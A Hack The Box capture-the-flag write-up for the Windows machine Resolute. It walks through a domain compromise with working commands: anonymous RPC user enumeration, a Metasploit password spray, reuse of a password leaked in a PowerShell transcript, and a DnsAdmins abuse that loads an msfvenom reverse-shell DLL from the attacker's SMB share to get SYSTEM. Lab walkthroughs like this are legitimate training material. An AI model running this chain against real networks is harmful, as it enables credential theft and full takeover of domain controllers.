---
layout: post
title: "Hack The Box - Resolute Writeup"
author: Chr0x6eOs
date: "2020-05-30"
subject: "Resolute Writeup"
keywords: [HTB, CTF, Hack The Box, Security, Windows, DNSAdmin, Metasploit, MSF]
lang: "en"
image:
    path: assets/htb/Resolute/logo.png
    width: 300
    height: 300
...

# Overview
![Resolute Image](/assets/htb/Resolute/resolute.png)

[Resolute](https://www.hackthebox.eu/home/machines/profile/220) is a medium windows box by [egre55](https://www.hackthebox.eu/home/users/profile/1190).

The box starts with enumeration of the domain using NetBIOS, which reveals a password in the Description field of one user. Using a password spraying attack, we get a valid match and can login as the user, which allows us to read user.txt.

Enumerating the users on the box, we find that only one other user is active. Searching for information about this user, we can find a Powershell Transcript file with the password of this user. Using the password we can login as the user. The user is part of the DnsAdmins group, which leads to code-execution as system, by exploiting a dll-injection. Using this technique we can get a shell as system and read root.txt.

## Information Gathering

### Nmap
Starting of with a nmap to check for open ports.

```bash
root@silence:~# nmap -sC -sV 10.10.10.169
Nmap scan report for 10.10.10.169
Host is up (0.065s latency).
Not shown: 989 closed ports
PORT     STATE SERVICE      VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-09 17:26:40Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/9%Time=5EB6E630%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h27m02s, deviation: 4h02m31s, median: 7m01s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: Resolute
|   NetBIOS computer name: RESOLUTE\x00
|   Domain name: megabank.local
|   Forest name: megabank.local
|   FQDN: Resolute.megabank.local
|_  System time: 2020-05-09T10:27:07-07:00
| smb-security-mode:
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-05-09T17:27:06
|_  start_date: 2020-05-09T17:24:42
```

## Enumeration
We have quite a few ports open. Nmap already gives us the domain name (megabank.local), so let us enumerate the domain a bit more using NetBIOS.

### NetBIOS - Port 139
We can manually enumerate using rpcclient.
```bash
root@silence:~# rpcclient -U '' -N 10.10.10.169                                                                                                                                                                        
rpcclient $> enumdomusers                                                                                                                                                                                                                     
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[ryan] rid:[0x451]
user:[marko] rid:[0x457]
user:[sunita] rid:[0x19c9]
user:[abigail] rid:[0x19ca]
user:[marcus] rid:[0x19cb]
user:[sally] rid:[0x19cc]
user:[fred] rid:[0x19cd]
user:[angela] rid:[0x19ce]
user:[felicia] rid:[0x19cf]
user:[gustavo] rid:[0x19d0]
user:[ulf] rid:[0x19d1]
user:[stevie] rid:[0x19d2]
user:[claire] rid:[0x19d3]
user:[paulo] rid:[0x19d4]
user:[steve] rid:[0x19d5]
user:[annette] rid:[0x19d6]
user:[annika] rid:[0x19d7]
user:[per] rid:[0x19d8]
user:[claude] rid:[0x19d9]
user:[melanie] rid:[0x2775]
user:[zach] rid:[0x2776]
user:[simon] rid:[0x2777]
user:[naoki] rid:[0x2778]
rpcclient $> queryuser 0x457
        User Name   :   marko
        Full Name   :   Marko Novak
        Home Drive  :
        Dir Drive   :
        Profile Path:
        Logon Script:
        Description :   Account created. Password set to Welcome123!
```
Connecting to the port with a null session (anonymous connection), we can manually query through all the users. We can find a password in the `Description` field of the user marko.

We could have also used a script like enum4linux to get the desired information.
```bash
root@silence:~# enum4linux -U 10.10.10.169
 =============================
|    Users on 10.10.10.169    |
 =============================
index: 0x10b0 RID: 0x19ca acb: 0x00000010 Account: abigail        Name: (null)      Desc: (null)                           
index: 0xfbc  RID: 0x1f4  acb: 0x00000210 Account: Administrator  Name: (null)      Desc: Built-in account for administering the computer/domain
index: 0x10b4 RID: 0x19ce acb: 0x00000010 Account: angela         Name: (null)      Desc: (null)                           
index: 0x10bc RID: 0x19d6 acb: 0x00000010 Account: annette        Name: (null)      Desc: (null)                           
index: 0x10bd RID: 0x19d7 acb: 0x00000010 Account: annika         Name: (null)      Desc: (null)                           
index: 0x10b9 RID: 0x19d3 acb: 0x00000010 Account: claire         Name: (null)      Desc: (null)                           
index: 0x10bf RID: 0x19d9 acb: 0x00000010 Account: claude         Name: (null)      Desc: (null)                           
index: 0xfbe  RID: 0x1f7  acb: 0x00000215 Account: DefaultAccount Name: (null)      Desc: A user account managed by the system.
index: 0x10b5 RID: 0x19cf acb: 0x00000010 Account: felicia        Name: (null)      Desc: (null)                           
index: 0x10b3 RID: 0x19cd acb: 0x00000010 Account: fred           Name: (null)      Desc: (null)                                   
index: 0xfbd  RID: 0x1f5  acb: 0x00000215 Account: Guest          Name: (null)      Desc: Built-in account for guest access to the computer/domain
index: 0x10b6 RID: 0x19d0 acb: 0x00000010 Account: gustavo        Name: (null)      Desc: (null)                           
index: 0xff4  RID: 0x1f6  acb: 0x00000011 Account: krbtgt         Name: (null)      Desc: Key Distribution Center Service Account
index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus         Name: (null)      Desc: (null)                           
index: 0x10a9 RID: 0x457  acb: 0x00000210 Account: marko          Name: Marko Novak Desc: Account created. Password set to Welcome123!
index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie        Name: (null)      Desc: (null)                           
[...]
```
Now that we have a possible password candidate, we can save all usernames to a file and check if we can login with the found password.

### Password spraying
```bash
root@silence:~# cat users.txt
Administrator
Guest
krbtgt
DefaultAccount
ryan
marko
sunita
abigail
marcus
sally
fred
angela
felicia
gustavo
ulf
stevie
claire
paulo
steve
annette
annika
per
claude
melanie
zach
simon
naoki
```
With all the usernames saved to a file, we can use metasploit's winrm_login module to check if we have any valid credentials.
```python
msf5 > use auxiliary/scanner/winrm/winrm_login
msf5 auxiliary(scanner/winrm/winrm_login) > set USER_FILE users.txt
USER_FILE => users.txt
msf5 auxiliary(scanner/winrm/winrm_login) > set PASSWORD Welcome123!
PASSWORD => Welcome123!                                                                                                
msf5 auxiliary(scanner/winrm/winrm_login) > set RHOSTS 10.10.10.169
RHOSTS => 10.10.10.169
msf5 auxiliary(scanner/winrm/winrm_login) > set DOMAIN megabank.local
DOMAIN => megabank.local
msf5 auxiliary(scanner/winrm/winrm_login) > run

[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\Administrator:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\Guest:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\krbtgt:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\DefaultAccount:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\ryan:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\marko:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\sunita:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\abigail:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\marcus:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\sally:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\fred:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\angela:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\felicia:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\gustavo:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\ulf:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\stevie:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\claire:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\paulo:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\steve:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\annette:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\annika:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\per:Welcome123! (Incorrect: )
[-] 10.10.10.169:5985 - LOGIN FAILED: megabank.local\claude:Welcome123! (Incorrect: )
[+] 10.10.10.169:5985 - Login Successful: megabank.local\melanie:Welcome123!
```
We found a working combination!

## Getting user-shell
Using [evil-winrm](https://github.com/Hackplayers/evil-winrm) we can login as the user melanie and get a shell.
```bash
root@silence:~# ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\melanie\Documents>
```
We get a shell as user and can read user.txt.
```console
*Evil-WinRM* PS C:\Users\melanie\Desktop> type user.txt
0c3be***************************
```

## Privesc to ryan
Now that we have a shell as melanie, let us try to escalate our privileges.
### Enumeration as melanie
```console
*Evil-WinRM* PS C:\users> dir

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        9/25/2019  10:43 AM                Administrator
d-----        12/4/2019   2:46 AM                melanie
d-r---       11/20/2016   6:39 PM                Public
d-----        9/27/2019   7:05 AM                ryan
```
Seems like ryan is the only other user on the system. Let us search for information on how to privesc to ryan.

```console
*Evil-WinRM* PS C:\> findstr /sp ryan *.txt
PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt: Username: MEGABANK\ryan
```
After a bit of searching around, I came across a Powershell Transcript file.
```console
*Evil-WinRM* PS C:\> type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
[…]
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
```
Seems like we have a possible password candidate for ryan.

```bash
root@silence:~# ruby evil-winrm.rb -i 10.10.10.169 -u ryan -p 'Serv3r4Admin4cc123!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\ryan\Documents>
```
Using the password with evil-winrm, we get a shell as ryan.

## Privesc to root
Now that we are ryan, let us find a way to get root on the machine.
### Enumeration as ryan
```console
Evil-WinRM* PS C:\Users\ryan\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                            Attributes
========================================== ================ ============================================== ===============================================================
Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
```
Looking through the groups of ryan, DnsAdmins seems interesting.

After a bit of research, I found two great articles [Abusing DNSAdmins privilege for escalation in Active Directory](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) and [From DnsAdmins to SYSTEM to Domain Compromise](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise), which both explain how to get system from Domain Admin.

### Exploiting DnsAdmin privileges
The first thing we need to do, is generate a malicious dll, which will give us arbitrary code-execution in the context of SYSTEM.
```bash
root@silence:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=443 -f dll > share/evil.dll
```
For this purpose, we will simply use msfvenom to generate us a shell.

```bash
root@silence:~/share# smbserver.py -smb2support share $(pwd)
Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Now, we serve the dll with impacket’s smbserver.py.

```console
*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd 10.10.10.169 /config /serverlevelplugindll \\10.10.14.24\share\evil.dll

Registry property serverlevelplugindll successfully reset.
Command completed successfully.
```
We have now configured dns to use our evil dll instead. We can verify that the command executed successfully, be querying the registry property:
```console
*Evil-WinRM* PS C:\Users\ryan\Documents> Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ -Name ServerLevelPluginDll

ServerLevelPluginDll : \\10.10.14.24\share\evil.dll
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS\Parameters\
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\DNS
PSChildName          : Parameters
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry
```
We indeed have changed the ServerLevelPluginDll. Let us restart dns now and check if we get a shell.

```console
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c sc stop dns
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\ryan\Documents> cmd /c sc start dns
SERVICE_NAME: dns
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2296
        FLAGS              :
```
Now we just have to restart dns.

```python
[*] Incoming connection (10.10.10.169,53078)
[*] AUTHENTICATE_MESSAGE (MEGABANK\RESOLUTE$,RESOLUTE)
[*] User RESOLUTE\RESOLUTE$ authenticated successfully
[*] RESOLUTE$::MEGABANK:4141414141414141:83ef6f5e3e34fc84f7d7d8f9627d7f08:010100000000000000272d373026d601acdab6f70617794e000000000100100059004c004a00700048004900640069000300100059004c004a0070004800490064006900020010005300650051004b00670073007a007800040010005300650051004b00670073007a0078000700080000272d373026d60106000400020000000800300030000000000000000000000000400000b3fd9b57faaa6f84735c85c369fe6485b30ca0f320609d66f1abecb748d925630a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:share)
```
Immediately after restarting, we get a connection on our smbserver.

```ruby
[*] Sending stage (206403 bytes) to 10.10.10.169
[*] Meterpreter session 1 opened (10.10.14.24:443 -> 10.10.10.169:53079) at 2020-05-09 20:32:40 +0200

msf5 exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                     Connection
  --  ----  ----                     -----------                     ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ RESOLUTE  10.10.14.24:443 -> 10.10.10.169:53079 (10.10.10.169)

msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 2492 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```
We get a callback on our listener with a shell as system and can now read root.txt.
```console
C:\Users\Administrator\Desktop>type root.txt
e1d94***************************
```